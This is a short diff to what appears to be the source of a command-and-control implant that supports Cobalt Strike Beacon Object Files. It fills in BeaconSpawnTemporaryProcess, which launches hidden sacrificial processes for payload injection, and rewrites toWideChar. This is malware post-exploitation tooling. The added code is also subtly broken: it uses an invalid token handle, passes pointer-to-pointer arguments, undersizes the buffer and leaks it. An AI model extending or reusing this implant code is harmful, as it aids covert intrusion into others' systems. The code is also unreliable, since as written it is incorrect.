@@ -278,7 +278,33 @@ VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
 
 BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo )
 {
-    // TODO: handle this
+    BOOL    bSuccess    = FALSE;
+    HANDLE  hToken      = INVALID_HANDLE_VALUE;
+    PCHAR   Path        = NULL;
+
+    if (x86) {
+        Path = Instance->Config.Process.Spawn86;
+    } else {
+        Path = Instance->Config.Process.Spawn64;
+    }
+
+    if (ignoreToken) {
+        bSuccess = Instance->Win32.CreateProcessA(NULL, Path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
+    } else {
+        PWCHAR wPath = NULL;
+        SIZE_T Size = 0;
+
+        Size = strlen(Path) * sizeof(WCHAR);
+        wPath = (PWCHAR) malloc(Size);
+
+        if (!toWideChar(Path, wPath, Size)) {
+            return FALSE;
+        }
+
+        bSuccess = Instance->Win32.CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, wPath, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &sInfo, &pInfo);
+    }
+
+    return bSuccess;
 }
 
 VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char * arg, int a_len )
@@ -306,13 +332,7 @@ VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
 
 BOOL toWideChar( char* src, wchar_t* dst, int max )
 {
-    int size = strlen(src) + 1;
-    if (size > max)
+    if (max < sizeof(wchar_t))
         return FALSE;
-
-    int result = swprintf(dst, max, L"hs", src);
-    if (result == -1)
-        return FALSE;
-
-    return TRUE;
+    return MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, src, -1, dst, max / sizeof(wchar_t));
 }
